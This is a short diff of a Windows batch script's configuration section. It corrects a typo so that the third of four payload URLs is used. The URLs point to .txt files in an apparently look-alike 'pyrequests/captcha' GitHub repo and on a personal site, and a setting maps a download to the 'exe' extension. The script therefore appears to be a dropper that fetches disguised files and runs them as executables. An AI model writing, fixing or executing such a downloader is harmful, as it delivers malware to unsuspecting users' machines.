@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 :: Configuration Section
 set "url1=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/xc.txt"
 set "url2=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/tgr.txt"
-set "url3What=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/QZ.txt"
+set "url3=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/QZ.txt"
 set "url4=https://alexbuckland.me/uploads/tgs.txt"
 
 set "ext1=exe"
